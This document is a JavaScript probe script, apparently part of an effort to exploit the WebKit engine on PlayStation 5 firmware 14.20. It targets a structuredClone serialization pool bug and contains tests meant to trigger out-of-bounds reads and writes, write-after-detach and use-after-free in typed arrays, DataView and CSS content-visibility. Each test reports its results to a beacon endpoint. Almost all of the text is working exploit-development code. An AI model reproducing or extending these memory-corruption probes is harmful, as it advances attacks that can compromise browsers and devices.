/* p111 — SerializedScriptValue objectPool index confusion
 *
 * TARGET: WebKit commit 010c6bdf (Jan 26 2024) fixed m_gcBuffer dual-purpose bug.
 * Safari 17.2 shipped Dec 11 2023 → PS5 14.20 has the BUGGY code.
 *
 * BUG: m_gcBuffer served as BOTH:
 *   1) Object pool (ObjectReferenceTag back-references index into this)
 *   2) GC keep-alive buffer (protects objects from collection during serialization)
 * Adding Maps, Sets, BigInts to keep-alive shifts pool indices.
 * ObjectReferenceTag(N) can resolve to WRONG object after shift.
 *
 * STRATEGY: Build object graphs where Maps/Sets/BigInts cause pool index shift,
 * then check if deserialized back-references point to wrong types.
 *
 * Also: valueOf-during-resize CORRECTED (use Symbol.toPrimitive for index path)
 *
 * Beacon prefix: V111P-
 */
(function(){
var RUN_ID = "v111p" + Math.random().toString(36).slice(2,12);
var PREFIX = "V111P-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press111-poolconfuse");

/* ====== P1: Basic pool confusion with Map shifting indices ====== */
function test_P1() {
  var r = {};
  try {
    // Build object graph: shared ref + Map (Map insertion shifts pool)
    var targetBuf = new ArrayBuffer(32);
    var targetView = new Uint32Array(targetBuf);
    targetView[0] = 0xAAAAAAAA;
    targetView[1] = 0xBBBBBBBB;

    var sharedObj = {marker: "SHARED_REF"};
    var map1 = new Map();
    map1.set("key1", sharedObj);
    map1.set("key2", targetBuf);

    // Graph with shared refs and Map — pool entries created during serialization:
    // Pool might be: [graph, sharedObj, targetBuf, map1, ...]
    // If Map insertion adds keep-alive entries, indices shift
    var graph = {
      ref1: sharedObj,    // Pool entry N
      map: map1,          // Map serialization adds keep-alive entries
      ref2: sharedObj,    // Should be ObjectReferenceTag(N) — but if shifted...
      buf: targetBuf,     // Pool entry M
      ref3: targetBuf     // Should be ObjectReferenceTag(M) — shifted?
    };

    var cloned = structuredClone(graph);

    // Check: are back-references correct?
    r.ref1_ref2_same = (cloned.ref1 === cloned.ref2);  // Should be true
    r.buf_ref3_same = (cloned.buf === cloned.ref3);     // Should be true
    r.ref1_type = typeof cloned.ref1;
    r.ref2_type = typeof cloned.ref2;
    r.ref3_type = typeof cloned.ref3;
    r.buf_type = cloned.buf instanceof ArrayBuffer ? "AB" : typeof cloned.buf;
    r.ref3_isAB = cloned.ref3 instanceof ArrayBuffer;

    // Critical check: did ref2 resolve to something OTHER than sharedObj?
    if (!r.ref1_ref2_same) {
      r.POOL_SHIFT = true;
      r.ref1_marker = cloned.ref1 && cloned.ref1.marker;
      r.ref2_marker = cloned.ref2 && cloned.ref2.marker;
      r.ref2_isAB = cloned.ref2 instanceof ArrayBuffer;
      r.ref2_isMap = cloned.ref2 instanceof Map;
    }

    // Did buf/ref3 get confused?
    if (!r.buf_ref3_same) {
      r.BUF_SHIFT = true;
      r.ref3_isObj = typeof cloned.ref3 === "object" && !(cloned.ref3 instanceof ArrayBuffer);
    }

    r.mapSize = cloned.map ? cloned.map.size : -1;
    r.mapKey1 = cloned.map && cloned.map.get("key1") && cloned.map.get("key1").marker;

    r.SURVIVED = true;
    B("P1-MAPSHIFT", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,100); B("P1-ERR", r); }
}

/* ====== P2: Set + BigInt pool confusion ====== */
function test_P2() {
  var r = {};
  try {
    var buf1 = new ArrayBuffer(16);
    new Uint32Array(buf1)[0] = 0x41414141;
    var buf2 = new ArrayBuffer(16);
    new Uint32Array(buf2)[0] = 0x42424242;

    var set1 = new Set();
    set1.add(buf1);
    set1.add("padding");
    set1.add(buf2);

    var bigval = BigInt("0xDEADBEEFCAFEBABE");

    // Complex graph with Set + BigInt to maximize pool disruption
    var graph = {
      a: buf1,
      s: set1,         // Set serialization with AB inside
      b: bigval,       // BigInt had buggy keep-alive handling
      c: buf1,         // Back-ref to buf1 — shifted?
      d: buf2,
      e: buf2,         // Back-ref to buf2 — shifted?
      f: bigval,       // Back-ref to bigval — shifted?
    };

    var cloned = structuredClone(graph);

    r.a_c_same = (cloned.a === cloned.c);
    r.d_e_same = (cloned.d === cloned.e);
    r.b_f_same = (cloned.b === cloned.f);

    r.a_isAB = cloned.a instanceof ArrayBuffer;
    r.c_isAB = cloned.c instanceof ArrayBuffer;
    r.c_type = typeof cloned.c;
    r.d_isAB = cloned.d instanceof ArrayBuffer;
    r.e_isAB = cloned.e instanceof ArrayBuffer;
    r.b_isBigInt = typeof cloned.b === "bigint";
    r.f_isBigInt = typeof cloned.f === "bigint";

    if (!r.a_c_same || !r.d_e_same || !r.b_f_same) {
      r.POOL_SHIFT = true;
      if (!r.a_c_same) {
        r.c_detail = String(cloned.c).slice(0,40);
        if (cloned.c instanceof ArrayBuffer) r.c_size = cloned.c.byteLength;
      }
      if (!r.b_f_same) {
        r.f_detail = typeof cloned.f + ":" + String(cloned.f).slice(0,40);
      }
    }

    r.setSize = cloned.s ? cloned.s.size : -1;
    r.SURVIVED = true;
    B("P2-SETBIGINT", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,100); B("P2-ERR", r); }
}

/* ====== P3: Nested Maps with TypedArray values — maximum pool pressure ====== */
function test_P3() {
  var r = {};
  try {
    var victimBuf = new ArrayBuffer(64);
    var victimView = new Float64Array(victimBuf);
    victimView[0] = 1.1; victimView[1] = 2.2; victimView[2] = 3.3;

    // Build nested Map chain to create many pool entries
    var innerMap = new Map();
    innerMap.set("victim", victimBuf);
    innerMap.set("nested", new Map([["deep", victimBuf]]));

    var midMap = new Map();
    midMap.set("inner", innerMap);
    midMap.set("also_victim", victimBuf);

    var set1 = new Set([victimBuf, innerMap, "filler"]);

    var graph = {
      direct_buf: victimBuf,       // Pool entry for victimBuf
      m1: innerMap,                 // Map with victimBuf inside
      m2: midMap,                   // Nested map referencing victimBuf
      s1: set1,                     // Set with victimBuf
      backref_buf: victimBuf,       // Should be ObjectReferenceTag → victimBuf
      backref_inner: innerMap,      // Should ref innerMap
      big1: BigInt("12345678901234567890"),
      big2: BigInt("98765432109876543210"),
      final_buf: victimBuf,         // Another back-ref, after BigInts
      final_inner: innerMap,        // Another back-ref, after BigInts
    };

    var cloned = structuredClone(graph);

    // Verify ALL back-references
    r.direct_backref = (cloned.direct_buf === cloned.backref_buf);
    r.direct_final = (cloned.direct_buf === cloned.final_buf);
    r.inner_backref = (cloned.m1 === cloned.backref_inner);
    r.inner_final = (cloned.m1 === cloned.final_inner);

    r.direct_type = cloned.direct_buf instanceof ArrayBuffer ? "AB" : typeof cloned.direct_buf;
    r.backref_type = cloned.backref_buf instanceof ArrayBuffer ? "AB" : typeof cloned.backref_buf;
    r.final_type = cloned.final_buf instanceof ArrayBuffer ? "AB" : typeof cloned.final_buf;

    if (!r.direct_backref || !r.direct_final || !r.inner_backref || !r.inner_final) {
      r.POOL_SHIFT = true;
      // Detailed analysis of what each ref resolved to
      if (!r.direct_final) {
        r.final_buf_actual = Object.prototype.toString.call(cloned.final_buf);
        if (cloned.final_buf instanceof Map) r.FINAL_IS_MAP = true;
        if (cloned.final_buf instanceof Set) r.FINAL_IS_SET = true;
        if (typeof cloned.final_buf === "bigint") r.FINAL_IS_BIGINT = true;
      }
    }

    // Check nested map integrity
    try {
      r.m1_has_victim = cloned.m1 && cloned.m1.get("victim") instanceof ArrayBuffer;
      r.m2_has_inner = cloned.m2 && cloned.m2.get("inner") instanceof Map;
      r.s1_size = cloned.s1 ? cloned.s1.size : -1;
    } catch(e2) { r.nestedErr = e2.name; }

    r.SURVIVED = true;
    B("P3-NESTEDMAP", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,100); B("P3-ERR", r); }
}

/* ====== P4: history.replaceState pool confusion (same serialization path) ====== */
function test_P4() {
  var r = {};
  try {
    var buf = new ArrayBuffer(32);
    new Uint32Array(buf)[0] = 0xFEEDFACE;
    var obj = {id: "marker_obj", data: [1,2,3]};
    var map = new Map([[1, obj], [2, buf]]);
    var set = new Set([buf, obj]);

    var state = {
      first_obj: obj,
      map: map,
      set: set,
      bignum: BigInt("0xCAFEBABEDEADBEEF"),
      second_obj: obj,      // Back-ref
      second_buf: buf,      // Back-ref
      third_obj: obj,       // Another back-ref, after BigInt
    };

    history.replaceState(state, "");
    var restored = history.state;

    if (restored) {
      r.first_second_same = (restored.first_obj === restored.second_obj);
      r.first_third_same = (restored.first_obj === restored.third_obj);
      r.first_type = typeof restored.first_obj;
      r.second_type = typeof restored.second_obj;
      r.third_type = typeof restored.third_obj;

      r.buf_same = (restored.second_buf instanceof ArrayBuffer);
      r.buf_val = restored.second_buf instanceof ArrayBuffer ?
        new Uint32Array(restored.second_buf)[0].toString(16) : "NOT_AB";

      r.mapSize = restored.map ? restored.map.size : -1;
      r.setSize = restored.set ? restored.set.size : -1;
      r.bigMatch = restored.bignum === BigInt("0xCAFEBABEDEADBEEF");

      if (!r.first_second_same || !r.first_third_same) {
        r.HISTORY_POOL_SHIFT = true;
        r.second_detail = Object.prototype.toString.call(restored.second_obj);
        r.third_detail = Object.prototype.toString.call(restored.third_obj);
      }
    } else {
      r.noState = true;
    }

    r.SURVIVED = true;
    B("P4-HISTPOOL", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,100); B("P4-ERR", r); }
}

/* ====== P5: Iterator-during-serialization — Map iterator keep-alive ====== */
function test_P5() {
  var r = {};
  try {
    // The commit specifically mentions Map/Set ITERATORS being incorrectly
    // added to m_gcBuffer. Build graph that forces iterator creation.
    var ta = new Uint8Array(new ArrayBuffer(16));
    ta[0] = 0xDE; ta[1] = 0xAD;

    var m = new Map();
    // Add many entries to force iterator allocation during serialization
    for (var i = 0; i < 50; i++) {
      m.set("k" + i, i < 25 ? ta.buffer : {idx: i});
    }

    var graph = {
      pre_buf: ta.buffer,
      map: m,
      post_buf: ta.buffer,   // Back-ref after Map with 50 entries serialized
      post_buf2: ta.buffer,  // Another back-ref
    };

    var cloned = structuredClone(graph);

    r.pre_post_same = (cloned.pre_buf === cloned.post_buf);
    r.pre_post2_same = (cloned.pre_buf === cloned.post_buf2);
    r.pre_isAB = cloned.pre_buf instanceof ArrayBuffer;
    r.post_isAB = cloned.post_buf instanceof ArrayBuffer;
    r.post2_isAB = cloned.post_buf2 instanceof ArrayBuffer;

    if (!r.pre_post_same || !r.pre_post2_same) {
      r.ITERATOR_SHIFT = true;
      r.post_type = Object.prototype.toString.call(cloned.post_buf);
      r.post2_type = Object.prototype.toString.call(cloned.post_buf2);
      // If shifted: try to read the wrong object as ArrayBuffer
      if (cloned.post_buf instanceof ArrayBuffer) {
        r.post_size = cloned.post_buf.byteLength;
      }
    }

    // Verify map integrity
    r.mapSize = cloned.map ? cloned.map.size : -1;
    r.mapK0 = cloned.map && cloned.map.get("k0") instanceof ArrayBuffer;
    r.mapK25 = cloned.map && typeof cloned.map.get("k25");

    r.SURVIVED = true;
    B("P5-ITERSHIFT", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,100); B("P5-ERR", r); }
}

/* ====== P6: Mixed types maximum confusion — AB + TA + Map + Set + BigInt + Date ====== */
function test_P6() {
  var r = {};
  try {
    var ab1 = new ArrayBuffer(8);
    new Float64Array(ab1)[0] = Math.PI;
    var ab2 = new ArrayBuffer(16);
    new Uint32Array(ab2).fill(0xDEADC0DE);
    var ta1 = new Uint8Array(ab1);
    var date1 = new Date(1234567890000);
    var re1 = /test_pattern/gi;

    var innerSet = new Set([ab1, date1, re1]);
    var innerMap = new Map([
      ["ab", ab2],
      ["set", innerSet],
      [42, BigInt("999999999999999999")]
    ]);

    // Maximal graph: every type that might affect pool indexing
    var graph = {
      ab1: ab1,
      ab2: ab2,
      date: date1,
      regex: re1,
      map: innerMap,
      set: innerSet,
      big1: BigInt("111111111111"),
      big2: BigInt("222222222222"),
      // Back-references after all the pool-disrupting types
      back_ab1: ab1,
      back_ab2: ab2,
      back_date: date1,
      back_regex: re1,
      back_map: innerMap,
      back_set: innerSet,
      back_big1: BigInt("111111111111"),
    };

    var cloned = structuredClone(graph);

    var checks = {
      ab1: cloned.ab1 === cloned.back_ab1,
      ab2: cloned.ab2 === cloned.back_ab2,
      date: cloned.date.getTime() === cloned.back_date.getTime(),
      regex: cloned.regex.source === cloned.back_regex.source,
      map: cloned.map === cloned.back_map,
      set: cloned.set === cloned.back_set,
      big1: cloned.big1 === cloned.back_big1,
    };

    r.allMatch = Object.values(checks).every(function(v) { return v; });
    r.checks = JSON.stringify(checks);

    if (!r.allMatch) {
      r.MIXED_POOL_SHIFT = true;
      // Find which refs broke
      for (var k in checks) {
        if (!checks[k]) {
          var backKey = "back_" + k;
          r["broken_" + k] = Object.prototype.toString.call(cloned[backKey]);
          r["expected_" + k] = Object.prototype.toString.call(cloned[k]);
        }
      }
    }

    r.SURVIVED = true;
    B("P6-MIXEDPOOL", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,100); B("P6-ERR", r); }
}

/* ====== P7: postMessage + transfer — different serialization entry point ====== */
function test_P7() {
  var r = {};
  try {
    var mc = new MessageChannel();

    var buf1 = new ArrayBuffer(32);
    new Uint32Array(buf1)[0] = 0xAAAAAAAA;
    var obj = {marker: "shared"};
    var map = new Map([[1, obj]]);

    var graph = {
      obj: obj,
      map: map,
      big: BigInt("0xFFFFFFFFFFFFFFFF"),
      back_obj: obj,
      buf: buf1,
    };

    mc.port2.onmessage = function(e) {
      var d = e.data;
      r.obj_back_same = (d.obj === d.back_obj);
      r.obj_type = typeof d.obj;
      r.back_type = typeof d.back_obj;
      r.buf_isAB = d.buf instanceof ArrayBuffer;
      r.buf_size = d.buf instanceof ArrayBuffer ? d.buf.byteLength : -1;
      r.mapSize = d.map ? d.map.size : -1;
      r.bigMatch = d.big === BigInt("0xFFFFFFFFFFFFFFFF");

      if (!r.obj_back_same) {
        r.POSTMSG_POOL_SHIFT = true;
        r.back_detail = Object.prototype.toString.call(d.back_obj);
      }

      // Transfer test: send buf as transferable
      var buf2 = new ArrayBuffer(64);
      new Uint32Array(buf2).fill(0xBBBBBBBB);
      var graph2 = {
        ref1: buf2,
        padding: new Map([["x", BigInt("123")]]),
        ref2: buf2,
      };

      var mc2 = new MessageChannel();
      mc2.port2.onmessage = function(e2) {
        var d2 = e2.data;
        r.transfer_ref_same = (d2.ref1 === d2.ref2);
        r.transfer_ref1_isAB = d2.ref1 instanceof ArrayBuffer;
        r.transfer_ref1_size = d2.ref1 instanceof ArrayBuffer ? d2.ref1.byteLength : -1;
        if (!r.transfer_ref_same) {
          r.TRANSFER_POOL_SHIFT = true;
        }
        mc2.port1.close(); mc2.port2.close();
        r.SURVIVED = true;
        B("P7-POSTMSG", r);
      };
      mc2.port1.postMessage(graph2, [buf2]);

      mc.port1.close(); mc.port2.close();
    };
    mc.port1.postMessage(graph);

    // Timeout fallback
    setTimeout(function() {
      if (!r.SURVIVED) {
        r.timeout = true;
        r.SURVIVED = true;
        B("P7-POSTMSG", r);
      }
    }, 3000);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,100); B("P7-ERR", r); }
}

/* ====== P8: CORRECTED toString-during-resize TOCTOU ====== */
/* Typed array index uses ToString, NOT valueOf! Our M8 was testing wrong callback. */
function test_P8() {
  var r = {};
  try {
    // ===== P8a: toString-during-resize READ =====
    var rab = new ArrayBuffer(64, {maxByteLength: 64});
    var ta = new Int32Array(rab); // 16 elements
    for (var i = 0; i < 16; i++) ta[i] = (i + 1) * 111;
    r.initial15 = ta[15]; // Should be 1776

    var evilReadIdx = {
      toString: function() {
        rab.resize(4); // Shrink to 1 element (4 bytes)
        return "15";   // Index 15 is now OOB!
      }
    };

    function readTA(arr, idx) { return arr[idx]; }
    for (var i = 0; i < 50000; i++) readTA(ta, 0);

    var readResult = readTA(ta, evilReadIdx);
    r.readResult = String(readResult);
    r.readType = typeof readResult;
    r.readAfterBuf = rab.byteLength; // Should be 4 if toString fired
    r.readResizeFired = (rab.byteLength === 4);

    if (readResult !== undefined) {
      r.READ_OOB = true; // Got a value from OOB index!
      if (typeof readResult === "number") {
        r.readHex = "0x" + (readResult >>> 0).toString(16);
      }
    }

    // ===== P8b: toString-during-resize WRITE =====
    rab.resize(64);
    for (var i = 0; i < 16; i++) ta[i] = (i + 1) * 111;

    var evilWriteIdx = {
      toString: function() {
        rab.resize(4); // Shrink to 1 element
        return "15";   // Write to OOB index!
      }
    };

    function writeTA(arr, idx, val) { arr[idx] = val; }
    for (var i = 0; i < 50000; i++) writeTA(ta, 0, i);

    writeTA(ta, evilWriteIdx, 0x41414141);
    r.writeAfterBuf = rab.byteLength;
    r.writeResizeFired = (rab.byteLength === 4);

    // Grow back and check if OOB write landed
    rab.resize(64);
    r.writeBack15 = ta[15];
    r.writeBack15Hex = "0x" + (ta[15] >>> 0).toString(16);
    if (ta[15] === 0x41414141) {
      r.WRITE_OOB = true; // OOB write confirmed!
    }
    // If writeBack15 is 0, WebKit correctly blocked the write
    // If writeBack15 is 1776 (original), grow-back preserved old data (interesting)

    // ===== P8c: valueOf-during-resize on VALUE (confirmed working) =====
    rab.resize(64);
    for (var i = 0; i < 16; i++) ta[i] = (i + 1) * 111;

    var evilVal = {
      valueOf: function() {
        rab.resize(4); // Shrink
        return 0x42424242;
      }
    };
    writeTA(ta, 15, evilVal); // Index 15 is numeric, no toString needed
    r.valAfterBuf = rab.byteLength;
    r.valResizeFired = (rab.byteLength === 4);
    rab.resize(64);
    r.valBack15 = ta[15];
    r.valBack15Hex = "0x" + (ta[15] >>> 0).toString(16);
    if (ta[15] === 0x42424242) {
      r.VALUE_OOB_WRITE = true;
    }

    // ===== P8d: Symbol.toPrimitive (overrides hint selection) =====
    rab.resize(64);
    for (var i = 0; i < 16; i++) ta[i] = (i + 1) * 111;

    var evilPrim = {};
    evilPrim[Symbol.toPrimitive] = function(hint) {
      rab.resize(4);
      return 15;
    };
    var primResult = readTA(ta, evilPrim);
    r.primResult = String(primResult);
    r.primAfterBuf = rab.byteLength;

    r.SURVIVED = true;
    B("P8-TOCTOU", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,100); B("P8-ERR", r); }
}

/* ====== P8x: Buffer DETACH via transfer during callback ====== */
function test_P8x() {
  var r = {};
  try {
    // ===== Detach during valueOf (write path) =====
    var buf1 = new ArrayBuffer(64);
    var ta1 = new Int32Array(buf1);
    ta1.fill(0xAAAAAAAA);

    var evilDetachVal = {
      valueOf: function() {
        structuredClone({x: buf1}, {transfer: [buf1]});
        return 0xDEADC0DE;
      }
    };

    function writeBuf(arr, idx, val) { arr[idx] = val; }
    for (var i = 0; i < 50000; i++) writeBuf(ta1, 0, i);

    try {
      writeBuf(ta1, 0, evilDetachVal);
      r.writeDetachSurvived = true;
      r.buf1Detached = (buf1.byteLength === 0);
      // Try to read back — if write went to freed memory, this is UAF
      try {
        r.readAfterDetach = ta1[0];
        r.readAfterType = typeof ta1[0];
        if (ta1[0] === 0xDEADC0DE) {
          r.WRITE_AFTER_DETACH = true; // Wrote to freed buffer!
        }
      } catch(e2) { r.readDetachErr = e2.name; }
    } catch(e2) { r.writeDetachErr = e2.name + ":" + e2.message.slice(0,60); }

    // ===== Detach during toString (read path) =====
    var buf2 = new ArrayBuffer(64);
    var ta2 = new Int32Array(buf2);
    ta2.fill(0xBBBBBBBB);

    var evilDetachIdx = {
      toString: function() {
        structuredClone({x: buf2}, {transfer: [buf2]});
        return "0";
      }
    };

    function readBuf(arr, idx) { return arr[idx]; }
    for (var i = 0; i < 50000; i++) readBuf(ta2, 0);

    try {
      var detachRead = readBuf(ta2, evilDetachIdx);
      r.readDetachResult = String(detachRead);
      r.readDetachType = typeof detachRead;
      r.buf2Detached = (buf2.byteLength === 0);
      if (detachRead !== undefined && typeof detachRead === "number") {
        r.READ_AFTER_DETACH = true; // Read from freed buffer!
        r.readDetachHex = "0x" + (detachRead >>> 0).toString(16);
      }
    } catch(e2) { r.readDetachIdxErr = e2.name + ":" + e2.message.slice(0,60); }

    // ===== Detach during toString for DataView (different C++ path) =====
    var buf3 = new ArrayBuffer(64);
    var dv = new DataView(buf3);
    for (var i = 0; i < 16; i++) dv.setInt32(i * 4, 0xCCCCCCCC);

    var evilDVIdx = {
      valueOf: function() {
        structuredClone({x: buf3}, {transfer: [buf3]});
        return 0;
      }
    };

    try {
      var dvRead = dv.getInt32(evilDVIdx);
      r.dvDetachResult = dvRead;
      r.buf3Detached = (buf3.byteLength === 0);
      if (dvRead !== undefined && typeof dvRead === "number" && dvRead !== 0) {
        r.DV_READ_AFTER_DETACH = true;
        r.dvDetachHex = "0x" + (dvRead >>> 0).toString(16);
      }
    } catch(e2) { r.dvDetachErr = e2.name; }

    r.SURVIVED = true;
    B("P8X-DETACH", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,100); B("P8X-ERR", r); }
}

/* ====== P9: GC pressure during structuredClone — force collection mid-serialization ====== */
function test_P9() {
  var r = {};
  try {
    // Create HEAVY allocation pressure before and during serialization
    // Goal: trigger GC while serializer holds raw pointers (CVE-2023-28205 class)
    var bufs = [];
    for (var i = 0; i < 100; i++) {
      bufs.push(new ArrayBuffer(1024));
    }

    var targetBuf = new ArrayBuffer(32);
    new Uint32Array(targetBuf)[0] = 0xCAFEBABE;
    var targetObj = {id: "target", val: 42};

    // Build graph with many unique objects (each gets a pool entry)
    var graph = {refs: [], target_buf: targetBuf, target_obj: targetObj};
    for (var i = 0; i < 200; i++) {
      graph.refs.push({
        idx: i,
        buf: new ArrayBuffer(64),
        map: new Map([[i, new Set([BigInt(i)])]]),
      });
    }
    graph.final_buf = targetBuf;  // Back-ref after 200 objects + Maps + Sets + BigInts
    graph.final_obj = targetObj;

    // Release pressure objects to make GC eager
    bufs = null;

    // Allocate more to trigger GC during clone
    var pressure = [];
    var cloned;
    try {
      for (var j = 0; j < 50; j++) {
        pressure.push(new ArrayBuffer(4096));
      }
      cloned = structuredClone(graph);
      pressure = null;
    } catch(e2) {
      r.cloneErr = e2.name + ":" + e2.message.slice(0,60);
    }

    if (cloned) {
      r.refsLen = cloned.refs ? cloned.refs.length : -1;
      r.final_buf_same = (cloned.target_buf === cloned.final_buf);
      r.final_obj_same = (cloned.target_obj === cloned.final_obj);
      r.final_buf_isAB = cloned.final_buf instanceof ArrayBuffer;
      r.final_obj_type = typeof cloned.final_obj;

      if (!r.final_buf_same || !r.final_obj_same) {
        r.GC_POOL_CORRUPTION = true;
        r.final_buf_actual = Object.prototype.toString.call(cloned.final_buf);
        r.final_obj_actual = Object.prototype.toString.call(cloned.final_obj);
      }
    }

    r.SURVIVED = true;
    B("P9-GCPRESSURE", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,100); B("P9-ERR", r); }
}

/* ====== P10: content-visibility CSS UAF (if supported) ====== */
function test_P10() {
  var r = {};
  try {
    // Check if content-visibility is supported
    var testDiv = document.createElement('div');
    testDiv.style.contentVisibility = 'hidden';
    r.cvSupported = (testDiv.style.contentVisibility === 'hidden');

    if (r.cvSupported) {
      var parent = document.createElement('div');
      parent.style.contentVisibility = 'hidden';
      parent.style.width = '100px';
      parent.style.height = '100px';
      document.body.appendChild(parent);

      var child = document.createElement('div');
      child.style.width = '50px';
      child.style.height = '50px';
      child.style.background = 'red';
      parent.appendChild(child);

      // Force layout
      void parent.offsetHeight;

      // Remove child (frees render objects)
      child.remove();

      // Toggle content-visibility to force recomputation
      parent.style.contentVisibility = 'auto';
      void parent.offsetHeight;

      parent.style.contentVisibility = 'hidden';
      void parent.offsetHeight;

      parent.style.contentVisibility = 'visible';
      void parent.offsetHeight;

      // Rapid toggle with MutationObserver
      var obs = new MutationObserver(function() {
        parent.style.contentVisibility =
          parent.style.contentVisibility === 'hidden' ? 'visible' : 'hidden';
      });
      obs.observe(parent, {attributes: true});
      parent.setAttribute('data-trigger', '1');

      setTimeout(function() {
        obs.disconnect();
        parent.remove();
        r.toggleCount = "completed";
        r.SURVIVED = true;
        B("P10-CONTENTVIS", r);
      }, 500);
    } else {
      r.SURVIVED = true;
      B("P10-CONTENTVIS", r);
    }
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,100); B("P10-ERR", r); }
}

/* ====== Run ====== */
try {
  test_P1();
  setTimeout(test_P2, 2000);
  setTimeout(test_P3, 4000);
  setTimeout(test_P4, 6000);
  setTimeout(test_P5, 8000);
  setTimeout(test_P6, 10000);
  setTimeout(test_P7, 13000);
  setTimeout(test_P8, 18000);
  setTimeout(test_P8x, 22000);
  setTimeout(test_P9, 26000);
  setTimeout(test_P10, 32000);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 5000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe111-done"); }, 80000);
})();
